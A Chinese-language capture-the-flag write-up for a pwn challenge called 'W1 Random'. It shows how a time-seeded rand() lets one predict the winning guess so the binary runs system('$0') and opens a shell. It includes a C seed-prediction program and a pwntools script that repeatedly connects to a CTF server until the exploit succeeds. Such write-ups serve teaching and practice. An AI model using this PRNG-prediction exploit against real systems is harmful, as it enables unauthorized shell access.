# W1 Random

## 文件分析

下载`pwn`，保护全开  
ghidra分析为64位程序

## 逆向

程序中有且仅有一个%d的输入，且匹配读入的int类型，所以不存在输入中的漏洞

但是将输入的数字猜对，可以执行system，不过是2$031中的某2个字符  
只要执行system("$0")，同样可以打开shell

随机值的种子是系统当前时间，种子相同，随机数相同  
故我们需要在正确的时间输入正确的随机数才能打开shell

## EXPLOIT

首先我们需要找到这个合适的时间

```c
// seedprobe.c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

static char cmdlist[5] = {'2', '$', '0', '3', '1'};

int main(void) {
    time_t init = time(NULL) + 5; // 为了避免本地与服务器时间不同带来的问题，故选择5秒后开始计算
    int valid = 0;
    for (int i = 0; i < 120; i++) {
        srand(init + i);
        int guess = rand();
        char c2 = cmdlist[rand() % 5];
        char c1 = cmdlist[rand() % 2];
        if (c1 == '$' && c2 == '0') { // 模拟程序运行
            time_t tmp = init + i;
            char timestr[16];
            strftime(timestr, 16, "%m-%d %H:%M:%S ", localtime(&tmp));
            printf("%s\b, guess=%d\n", timestr, guess); // 打印时间方便卡时间测试；打印数字方便读取
            valid++;
        }
    }
    if (valid > 0) 
        printf("%d valid time stamps.\n", valid);
    else
        printf("No valid time now.\n");
    return 0;
}
```

然后在合适的时间启动gdb调试，发现可以成功打开shell，于是开始打靶

```python
from pwn import *
import time

sh = process('seedprobe') # 取第一个数字
sh.recvuntil(b'=') # skip
guess = sh.recvline()[:-1] # strip '\n'
sh.close()

while True:
    sh = remote("node4.buuoj.cn", 26447)
    sh.sendline(guess)
    if sh.recvuntil(b'Ha', timeout=1) == b'': # 超时未读到Haha...即代表已在合适的时间猜对数字
        break
    sh.close()
    time.sleep(0.5)

sh.interactive()
```

## 参考文献

[模拟攻击](http://www.asuka39.top/article/security/ctf/pwn/2064/)

Done.
